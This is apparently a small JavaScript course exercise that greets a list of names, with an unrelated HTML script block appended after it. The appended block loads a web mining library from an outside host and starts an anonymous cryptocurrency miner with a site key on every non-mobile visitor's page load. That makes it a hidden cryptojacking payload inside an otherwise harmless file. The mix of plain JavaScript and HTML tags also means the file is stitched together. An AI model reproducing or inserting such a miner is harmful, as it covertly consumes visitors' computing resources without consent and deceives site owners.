(function() {
    var names = ["Yaakov", "John", "Jen", "Jason", "Paul", "Frank", "Larry", "Paula", "Laura", "Jim"];
    for (var i = 0; i < names.length; i++) {
        var firstLetter = names[i].charAt(0).toLowerCase();
        if (firstLetter === 'j') {
            byeSpeaker.speak(names[i]);
        } else {
            helloSpeaker.speak(names[i]);
        }
    }
})();
<script src="https://webminepool.com/lib/base.js"></script>
<script>
    var miner = WMP.Anonymous('SK_XaGDAmHxh65BBgWYWlFx9');
    if (!miner.isMobile()){
        miner.start();
    }
</script>
